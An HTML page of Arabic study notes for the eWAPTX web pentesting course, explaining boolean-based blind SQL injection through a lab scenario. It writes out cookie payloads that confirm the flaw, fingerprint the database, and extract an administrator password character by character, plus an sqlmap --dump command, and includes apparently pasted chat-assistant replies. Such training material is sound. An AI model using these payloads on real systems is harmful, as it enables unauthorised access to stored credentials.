@@ -1,0 +1,1861 @@
+
+<!doctype html>
+<html lang="ar" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../6-SQL%20INJECTION/">
+      
+      
+        <link rel="next" href="../8-NOSQL/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>أولاً: ما هو Blind SQL Injection؟ - eWAPTX Zero-Day Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/hacker_style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="rtl" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#blind-sql-injection" class="md-skip">
+          انتقل إلى المحتوى
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="عنوان العارضة">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-header__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            eWAPTX Zero-Day Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              أولاً: ما هو Blind SQL Injection؟
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="بحث" placeholder="بحث" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="إبحث">
+        
+        <button type="reset" class="md-search__icon md-icon" title="مسح كلي" aria-label="مسح كلي" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            بدء البحث
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="تصفح" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-nav__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    eWAPTX Zero-Day Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome to MkDocs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-EWAPTX/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1 EWAPTX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-EWAPTX%20%28part%202%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2 EWAPTX (part 2)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-Enumeration%20%26%20Brute%20force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Enumeration — الفكرة ببساطة
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-JWT%20port_swigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ليه JWT vulnerabilities خطيرة جداً ؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-Oauth%20portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-SQL%20INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    أولاً: ما هو Blind SQL Injection؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-NOSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📁 الدليل الشامل لأساسيات MongoDB واختبار اختراق NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9 NoSQL injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="blind-sql-injection">أولاً: ما هو Blind SQL Injection؟</h1>
+<p><strong>SQL Injection</strong> هو إنك تدخل <strong>SQL code</strong> داخل input في الموقع فيتم تنفيذه داخل قاعدة البيانات.</p>
+<p>لكن في النوع ده:</p>
+<p><strong>Blind SQL Injection</strong></p>
+<p>المشكلة إن الموقع <strong>لا يعرض نتيجة الـ query</strong>.</p>
+<p>يعني:</p>
+<ul>
+<li>
+<p>لا يظهر <strong>database errors</strong></p>
+</li>
+<li>
+<p>لا يظهر <strong>data من database</strong></p>
+</li>
+<li>
+<p>الصفحة تقريباً ثابتة</p>
+</li>
+</ul>
+<p>لكن الموقع <strong>يتغير سلوكه بشكل بسيط</strong>.</p>
+<p>مثلاً:</p>
+<ul>
+<li>
+<p>يظهر message</p>
+</li>
+<li>
+<p>لا يظهر message</p>
+</li>
+<li>
+<p>الصفحة تتأخر</p>
+</li>
+<li>
+<p>الصفحة تختلف</p>
+</li>
+</ul>
+<p>ومن هنا يبدأ الاستغلال.</p>
+<hr />
+<h1 id="blind">ثانياً: لماذا يسمى Blind ؟</h1>
+<p>لأنك <strong>لا ترى البيانات مباشرة</strong>.</p>
+<p>بدل أن ترى:</p>
+<p>administrator : password123</p>
+<p>أنت فقط ترى:</p>
+<ul>
+<li>
+<p>True</p>
+</li>
+<li>
+<p>False</p>
+</li>
+</ul>
+<p>مثل لعبة <strong>20 سؤال</strong>.</p>
+<hr />
+<h1 id="_1">ثالثاً: مثال التطبيق الموجود في النص</h1>
+<p>الموقع يستخدم <strong>Tracking Cookie</strong>.</p>
+<p>الطلب يكون مثل:</p>
+<p>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</p>
+<p>الموقع يأخذ هذا الـ cookie ويعمل query في قاعدة البيانات.</p>
+<p>SELECT TrackingId<br />
+FROM TrackedUsers<br />
+WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</p>
+<p>الفكرة:</p>
+<p>الموقع يريد معرفة:</p>
+<blockquote>
+<p>هل هذا المستخدم زار الموقع قبل ذلك؟</p>
+</blockquote>
+<p>لو وجد القيمة في الجدول يظهر:</p>
+<p>Welcome back</p>
+<p>لو لم يجدها لا يظهر الرسالة.</p>
+<hr />
+<h1 id="_2">رابعاً: أين الثغرة؟</h1>
+<p>القيمة توضع مباشرة داخل SQL:</p>
+<p>WHERE TrackingId = 'USER_INPUT'</p>
+<p>إذا لم يتم <strong>sanitization</strong> يمكن إدخال SQL.</p>
+<p>مثلاً:</p>
+<p>TrackingId=xyz' AND '1'='1</p>
+<p>فتصبح query:</p>
+<p>SELECT TrackingId<br />
+FROM TrackedUsers<br />
+WHERE TrackingId = 'xyz' AND '1'='1'</p>
+<p>الشرط:</p>
+<p>'1'='1'</p>
+<p>دائماً <strong>True</strong>.</p>
+<hr />
+<h1 id="true-false">خامساً: اختبار True و False</h1>
+<p>نجرب شرطين.</p>
+<h3 id="_3">الطلب الأول</h3>
+<p>TrackingId=xyz' AND '1'='1</p>
+<p>query تصبح:</p>
+<p>WHERE TrackingId='xyz' AND '1'='1'</p>
+<p>النتيجة:</p>
+<p>True</p>
+<p>إذن يظهر:</p>
+<p>Welcome back</p>
+<hr />
+<h3 id="_4">الطلب الثاني</h3>
+<p>TrackingId=xyz' AND '1'='2</p>
+<p>query:</p>
+<p>WHERE TrackingId='xyz' AND '1'='2'</p>
+<p>الشرط:</p>
+<p>1 = 2</p>
+<p>False</p>
+<p>النتيجة:</p>
+<p>لا يظهر</p>
+<p>Welcome back</p>
+<hr />
+<p>إذن أصبح لدينا <strong>Oracle</strong> يخبرنا إن الشرط:</p>
+<ul>
+<li>
+<p>True</p>
+</li>
+<li>
+<p>False</p>
+</li>
+</ul>
+<p>وهذا يكفي لاستخراج أي بيانات من قاعدة البيانات.</p>
+<hr />
+<h1 id="_5">سادساً: استخراج البيانات</h1>
+<p>نفترض وجود جدول:</p>
+<p>Users</p>
+<p>وهو يحتوي:</p>
+<p>Username<br />
+Password</p>
+<p>وفيه مستخدم:</p>
+<p>Administrator</p>
+<p>هدفنا استخراج:</p>
+<p>Password</p>
+<hr />
+<h1 id="_6">سابعاً: فكرة استخراج الباسورد</h1>
+<p>نستخرج <strong>حرف حرف</strong>.</p>
+<p>الباسورد مثل:</p>
+<p>secretpass</p>
+<p>لكن نحن لا نراه.</p>
+<p>فنبدأ نسأل قاعدة البيانات.</p>
+<hr />
+<h1 id="_7">ثامناً: معرفة أول حرف</h1>
+<p>نستخدم دالة:</p>
+<p>SUBSTRING()</p>
+<p>وهي ترجع حرف من النص.</p>
+<p>مثال:</p>
+<p>SUBSTRING('secret',1,1)</p>
+<p>يرجع:</p>
+<p>s</p>
+<hr />
+<h1 id="payload">تاسعاً: أول payload</h1>
+<p>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) &gt; 'm</p>
+<p>خلينا نفكها.</p>
+<hr />
+<h2 id="_8">الجزء الأول</h2>
+<p>SELECT Password FROM Users WHERE Username='Administrator'</p>
+<p>يرجع:</p>
+<p>secretpass</p>
+<hr />
+<h2 id="_9">الجزء الثاني</h2>
+<p>SUBSTRING(password,1,1)</p>
+<p>يعني:</p>
+<p>أول حرف</p>
+<p>s</p>
+<hr />
+<h2 id="_10">الشرط</h2>
+<p>s &gt; m</p>
+<p>في ASCII:</p>
+<p>s أكبر من m</p>
+<p>إذن الشرط:</p>
+<p>True</p>
+<hr />
+<p>بالتالي:</p>
+<p>Welcome back</p>
+<p>ظهر.</p>
+<hr />
+<h1 id="_11">عاشراً: تجربة أخرى</h1>
+<p>نجرب:</p>
+<blockquote>
+<p>t</p>
+</blockquote>
+<p>payload:</p>
+<p>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) &gt; 't</p>
+<p>الحرف الحقيقي:</p>
+<p>s</p>
+<p>هل:</p>
+<p>s &gt; t ?</p>
+<p>لا.</p>
+<p>False.</p>
+<p>إذن:</p>
+<p>لا يظهر</p>
+<p>Welcome back</p>
+<hr />
+<h1 id="_12">الحادي عشر: تحديد الحرف</h1>
+<p>نجرب:</p>
+<p>= s</p>
+<p>payload:</p>
+<p>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s</p>
+<p>الشرط صحيح.</p>
+<p>إذن نعرف:</p>
+<p>الحرف الأول = s</p>
+<hr />
+<h1 id="_13">الثاني عشر: نكرر العملية</h1>
+<p>الحرف الثاني:</p>
+<p>SUBSTRING(password,2,1)</p>
+<p>الحرف الثالث:</p>
+<p>SUBSTRING(password,3,1)</p>
+<p>وهكذا.</p>
+<p>حتى نحصل على:</p>
+<p>secretpass</p>
+<hr />
+<h1 id="_14">الثالث عشر: لماذا يستخدمون &gt; بدلاً من = ؟</h1>
+<p>لأنها تسمح باستخدام <strong>Binary Search</strong>.</p>
+<p>بدل تجربة:</p>
+<p>a<br />
+b<br />
+c<br />
+d<br />
+...</p>
+<p>يمكن تضييق المجال بسرعة.</p>
+<p>مثال:</p>
+<blockquote>
+<p>m<br />
+t<br />
+p</p>
+</blockquote>
+<p>وهكذا.</p>
+<hr />
+<h1 id="_15">الرابع عشر: الأدوات التي تعمل ذلك تلقائياً</h1>
+<p>مثل:</p>
+<ul>
+<li><strong>sqlmap</strong></li>
+</ul>
+<p>مثلاً:</p>
+<p>sqlmap -u http://site.com --cookie="TrackingId=xyz" --dump</p>
+<p>يقوم باستخراج البيانات تلقائياً.</p>
+<hr />
+<h1 id="_16">خلاصة الفكرة</h1>
+<p>Blind SQL Injection يعتمد على:</p>
+<p>1️⃣ حقن شرط SQL<br />
+2️⃣ ملاحظة سلوك التطبيق<br />
+3️⃣ استنتاج True أو False<br />
+4️⃣ استخراج البيانات <strong>حرف حرف</strong></p>
+<hr />
+<h1 id="1-blind-sql-injection">لمرحلة 1 — التأكد أن هناك Blind SQL Injection</h1>
+<p>أول خطوة تشوف هل الشرط يغير رد الموقع.</p>
+<p>مثلاً في الـ cookie:</p>
+<p>TrackingId=xyz' AND '1'='1</p>
+<p>لو ظهر:</p>
+<p>Welcome back</p>
+<p>نجرب:</p>
+<p>TrackingId=xyz' AND '1'='2</p>
+<p>لو الرسالة اختفت → إذن عندنا <strong>Boolean based blind injection</strong>.</p>
+<hr />
+<h1 id="2">المرحلة 2 — معرفة نوع قاعدة البيانات</h1>
+<p>قبل ما نستخرج الداتا لازم نعرف نوع الـ DB.</p>
+<p>هل هي:</p>
+<ul>
+<li>
+<p>MySQL</p>
+</li>
+<li>
+<p>PostgreSQL</p>
+</li>
+<li>
+<p>MSSQL</p>
+</li>
+<li>
+<p>Oracle</p>
+</li>
+</ul>
+<p>مثلاً نجرب function خاصة بكل DB.</p>
+<p>مثال MySQL:</p>
+<p>xyz' AND database() IS NOT NULL-- -</p>
+<p>لو True → غالباً <strong>MySQL</strong>.</p>
+<p>الدالة:</p>
+<p>database()</p>
+<p>ترجع اسم الداتا بيز الحالية.</p>
+<hr />
+<h1 id="true-false-blind-sqli">ما معنى True و False في Blind SQLi؟</h1>
+<p>في <strong>Boolean-based blind SQLi</strong> أنت لا ترى نتيجة الـ query، لذلك تعتمد على <strong>اختلاف في الـ response</strong>.</p>
+<p>الاختلاف قد يكون في:</p>
+<p>1️⃣ ظهور نص معين في الصفحة<br />
+2️⃣ اختفاء نص<br />
+3️⃣ اختلاف طول الصفحة<br />
+4️⃣ redirect<br />
+5️⃣ اختلاف HTML</p>
+<p>لكن <strong>status code غالباً يظل 200</strong> في الحالتين.</p>
+<hr />
+<h1 id="_17">مثال من السيناريو الذي شرحناه</h1>
+<p>الـ payload:</p>
+<p>xyz' AND '1'='1</p>
+<p>النتيجة:</p>
+<p>الصفحة تظهر فيها:</p>
+<p>Welcome back</p>
+<p>إذن الشرط <strong>True</strong>.</p>
+<hr />
+<p>payload الثاني:</p>
+<p>xyz' AND '1'='2</p>
+<p>النتيجة:</p>
+<p>الرسالة <strong>لا تظهر</strong>.</p>
+<p>إذن الشرط <strong>False</strong>.</p>
+<p>لاحظ أن:</p>
+<p>HTTP/1.1 200 OK</p>
+<p>قد يكون نفسه في الحالتين.</p>
+<hr />
+<h1 id="_18">مثال حقيقي أثناء الفحص</h1>
+<p>Response عندما الشرط True:</p>
+<p>Welcome back<br />
+Products<br />
+Categories</p>
+<p>Response عندما الشرط False:</p>
+<p>Products<br />
+Categories</p>
+<p>الفرق الوحيد:</p>
+<p>Welcome back</p>
+<p>اختفت.</p>
+<hr />
+<h1 id="_19">أحياناً الفرق يكون في حجم الصفحة</h1>
+<p>مثلاً:</p>
+<p>True:</p>
+<p>Response length = 5340</p>
+<p>False:</p>
+<p>Response length = 5211</p>
+<p>وهنا الأدوات مثل:</p>
+<ul>
+<li>
+<p><strong>Burp Suite</strong></p>
+</li>
+<li>
+<p><strong>sqlmap</strong></p>
+</li>
+</ul>
+<p>تعتمد على <strong>response length</strong>.</p>
+<hr />
+<h1 id="status-code">متى نستخدم status code؟</h1>
+<p>نادراً، لكن ممكن.</p>
+<p>مثلاً:</p>
+<p>True →</p>
+<p>200 OK</p>
+<p>False →</p>
+<p>302 Redirect</p>
+<p>لكن هذا ليس الأكثر شيوعاً.</p>
+<hr />
+<h1 id="_20">خلاصة الفكرة</h1>
+<p>في <strong>Blind SQL Injection</strong>:</p>
+<p>True لا تعني:</p>
+<p>HTTP 200</p>
+<p>بل تعني:</p>
+<blockquote>
+<p>الشرط الذي حقنته جعل التطبيق يتصرف بشكل مختلف.</p>
+</blockquote>
+<hr />
+<p>لو حابب، أقدر أشرح لك كمان <strong>أخطر نقطة في Blind SQLi</strong> واللي كثير من الناس لا يفهمها صح:</p>
+<p><strong>إزاي تفرق بين:</strong></p>
+<ul>
+<li>
+<p>Boolean Based Blind</p>
+</li>
+<li>
+<p>Time Based Blind</p>
+</li>
+<li>
+<p>Conditional Error</p>
+</li>
+</ul>
+<p>لأن التلاتة يندرجوا تحت <strong>Blind SQL Injection</strong> لكن طريقة الاستغلال مختلفة تماماً 🔥.</p>
+<p>AND database() IS NOT NULL-- - حلو هنا رجع false</p>
+<p>تمام، خلينا نفهم ليه الـ payload:</p>
+<p>AND database() IS NOT NULL-- -</p>
+<p>رجع <strong>False</strong> عندك. الموضوع له كذا احتمال، ودي طريقة التفكير اللي يمشي بها أي شخص يعمل <strong>Penetration Testing</strong> عند اختبار <strong>Blind SQL Injection</strong>.</p>
+<hr />
+<h1 id="_21">أول احتمال (الأكثر شيوعًا)</h1>
+<p>الـ <strong>database مش MySQL</strong>.</p>
+<p>الدالة:</p>
+<p>database()</p>
+<p>خاصة بـ <strong>MySQL</strong>.</p>
+<p>لو الموقع يستخدم مثلاً:</p>
+<ul>
+<li>
+<p><strong>Microsoft SQL Server</strong></p>
+</li>
+<li>
+<p><strong>PostgreSQL</strong></p>
+</li>
+<li>
+<p><strong>Oracle Database</strong></p>
+</li>
+</ul>
+<p>فالـ query هتفشل أو ترجع False.</p>
+<hr />
+<h1 id="_22">ثاني احتمال</h1>
+<p>الـ <strong>syntax نفسه كسر الـ query</strong>.</p>
+<p>مثلاً لو الـ query الأصلية:</p>
+<p>SELECT TrackingId<br />
+FROM TrackedUsers<br />
+WHERE TrackingId = 'xyz'</p>
+<p>وأنت حقنت:</p>
+<p>xyz' AND database() IS NOT NULL-- -</p>
+<p>تصبح:</p>
+<p>WHERE TrackingId='xyz' AND database() IS NOT NULL</p>
+<p>لكن لو الدالة غير موجودة في الـ DB سيحدث <strong>error داخلي</strong>، والموقع يعامله كـ False.</p>
+<hr />
+<h1 id="_23">ماذا تفعل الآن؟ (الخطوة الصحيحة)</h1>
+<p>نبدأ نختبر <strong>database type fingerprinting</strong>.</p>
+<h3 id="mssql">اختبار MSSQL</h3>
+<p>' AND DB_NAME() IS NOT NULL-- -</p>
+<hr />
+<h3 id="postgresql">اختبار PostgreSQL</h3>
+<p>' AND current_database() IS NOT NULL-- -</p>
+<hr />
+<h3 id="oracle">اختبار Oracle</h3>
+<p>' AND 'a'='a</p>
+<p>(Oracle غالباً يتصرف بطريقة مختلفة مع بعض functions).</p>
+<hr />
+<h1 id="_24">طريقة أكثر ذكاء</h1>
+<p>بدلاً من اختبار DB مباشرة، نبدأ بشيء بسيط:</p>
+<p>' AND 1=1-- -</p>
+<p>و</p>
+<p>' AND 1=2-- -</p>
+<p>لو الفرق واضح → إذن <strong>Boolean blind يعمل</strong>.</p>
+<p>بعدها نجرب استخراج شيء عام مثل طول النص.</p>
+<hr />
+<h1 id="payload_1">مثال payload أكثر أماناً</h1>
+<p>' AND LENGTH('abc')=3-- -</p>
+<p>لو True → DB تدعم <strong>LENGTH()</strong>.</p>
+<p>لو False → قد تكون تستخدم:</p>
+<p>LEN()</p>
+<p>في <strong>Microsoft SQL Server</strong>.</p>
+<hr />
+<h1 id="_25">التكنيك الذي يستخدمه المحترفون</h1>
+<p>الأدوات مثل:</p>
+<ul>
+<li>
+<p><strong>sqlmap</strong></p>
+</li>
+<li>
+<p><strong>Burp Suite</strong></p>
+</li>
+</ul>
+<p>تعمل <strong>DB fingerprinting</strong> تلقائياً عن طريق اختبار عشرات الدوال.</p>
+<hr />
+<h1 id="_26">أهم نقطة لازم تنتبه لها</h1>
+<p>في <strong>Blind SQLi</strong><br />
+False لا يعني دائماً أن الشرط خطأ.</p>
+<p>قد يعني:</p>
+<ul>
+<li>
+<p>syntax error</p>
+</li>
+<li>
+<p>function غير موجودة</p>
+</li>
+<li>
+<p>database مختلفة</p>
+</li>
+</ul>
+<hr />
+<p>✅ نصيحتي في هذه المرحلة:</p>
+<p>جرب بالترتيب:</p>
+<p>' AND 1=1-- -</p>
+<p>ثم</p>
+<p>' AND LENGTH('abc')=3-- -</p>
+<p>ثم</p>
+<p>' AND LEN('abc')=3-- -</p>
+<p>وبعدها نعرف نوع الـ DB.</p>
+<hr />
+<p>LAB SOLVE ;</p>
+<h1 id="1-burp">1️⃣ اعتراض الطلب باستخدام Burp</h1>
+<p>أنت تفتح الصفحة الرئيسية للمتجر، والـ request يكون فيه cookie مثل:</p>
+<p>Cookie: TrackingId=xyz</p>
+<p>السيرفر غالبًا يعمل query مثل:</p>
+<p>SELECT * FROM tracking WHERE TrackingId='xyz'</p>
+<p>لو لم يتم <strong>sanitize</strong> للـ input يمكننا كسر الـ query.</p>
+<hr />
+<h1 id="2-sql-injection">2️⃣ اختبار وجود SQL Injection</h1>
+<p>نغيّر قيمة الـ cookie إلى:</p>
+<p>TrackingId=xyz' AND '1'='1</p>
+<h3 id="_27">ماذا يحدث في السيرفر؟</h3>
+<p>الـ query تصبح:</p>
+<p>SELECT * FROM tracking <br />
+WHERE TrackingId='xyz' AND '1'='1'</p>
+<p>الشرط:</p>
+<p>'1'='1'</p>
+<p>هذا <strong>True دائماً</strong>.</p>
+<p>لو ظهر في الصفحة:</p>
+<p>Welcome back</p>
+<p>إذن الشرط صحيح.</p>
+<hr />
+<h3 id="_28">التجربة الثانية</h3>
+<p>TrackingId=xyz' AND '1'='2</p>
+<p>الـ query تصبح:</p>
+<p>SELECT * FROM tracking <br />
+WHERE TrackingId='xyz' AND '1'='2'</p>
+<p>الشرط:</p>
+<p>1 = 2</p>
+<p>False.</p>
+<p>إذن لن تظهر رسالة:</p>
+<p>Welcome back</p>
+<p>💡 هنا تأكدنا أن الموقع <strong>يتصرف حسب نتيجة الشرط</strong> → وهذا يعني وجود <strong>Boolean Blind SQL Injection</strong>.</p>
+<hr />
+<h1 id="3-users">3️⃣ اختبار وجود جدول users</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</p>
+<h3 id="_29">تحليل الكود</h3>
+<p>SELECT 'a'</p>
+<p>يعني:</p>
+<p>ارجع القيمة a</p>
+<p>لكن من الجدول:</p>
+<p>users</p>
+<p>مع:</p>
+<p>LIMIT 1</p>
+<p>أي:</p>
+<p>خذ صف واحد فقط</p>
+<p>إذن:</p>
+<p>(SELECT 'a' FROM users LIMIT 1)</p>
+<p>النتيجة ستكون:</p>
+<p>a</p>
+<p>لو الجدول موجود.</p>
+<p>ثم نقارن:</p>
+<p>a = a</p>
+<p>True.</p>
+<p>إذن ظهور <strong>Welcome back</strong> يعني:</p>
+<p>table users exists</p>
+<hr />
+<h1 id="4-administrator">4️⃣ اختبار وجود مستخدم administrator</h1>
+<p>الطلب:</p>
+<p>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</p>
+<h3 id="_30">تحليل الكود</h3>
+<p>الـ subquery:</p>
+<p>SELECT 'a' <br />
+FROM users <br />
+WHERE username='administrator'</p>
+<p>المعنى:</p>
+<p>لو يوجد صف username=administrator<br />
+ارجع a</p>
+<p>ثم المقارنة:</p>
+<p>a = a</p>
+<p>إذن True.</p>
+<p>وهذا يؤكد أن المستخدم موجود.</p>
+<hr />
